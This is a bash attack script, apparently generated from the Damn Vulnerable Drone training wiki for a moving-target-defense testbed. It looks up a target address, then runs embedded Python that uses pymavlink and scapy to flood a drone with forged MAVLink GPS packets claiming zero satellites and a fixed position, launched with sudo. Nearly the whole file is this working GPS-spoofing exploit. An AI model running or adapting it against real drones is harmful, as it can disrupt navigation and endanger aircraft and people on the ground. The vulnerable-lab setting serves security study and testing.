#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Satellite-Spoofing.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition
# This block dynamically queries the MTD interface for an active target.
# ==========================================================
echo "INFO: Querying MTD interface for active target..."

# --- Project Root Resolution ---
# 1. 현재 실행되는 쉘 스크립트의 실제 위치를 찾습니다.
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
# 2. 'dvd_lite' 폴더를 포함하는 프로젝트 루트 디렉토리를 찾습니다. (현재 위치에서 4단계 위)
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")
# -----------------------------

# PYTHONPATH 환경 변수 대신, 직접 프로젝트 루트로 이동하여 파이썬 모듈을 실행합니다.
# 이 방식은 'sudo'가 환경 변수를 초기화하는 문제를 우회할 수 있어 더 안정적입니다.
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
popd > /dev/null

if [ $? -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

# 콜론을 기준으로 IP와 PORT를 분리하여 변수에 저장합니다.
TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

echo "INFO: Active target acquired -> ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=satellite-spoofing src=Satellite-Spoofing.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:${TARGET_PORT}')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_gps_raw_int(mav):
    gps_raw_int = mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=1,  # No GPS fix
        lat=473566100,
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=0
    )
    return gps_raw_int.pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python satellite-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    while True:
        gps_packet = create_gps_raw_int(mav)
        send_mavlink_packet(gps_packet, target_ip, target_port)
        print(f"Sent GPS spoofing packet with 0 satellites to {target_ip}:{target_port}")
PY

log "[BLOCK 2] type=shell"
sudo python3 satellite-spoofing.py ${TARGET_IP}:${TARGET_PORT}

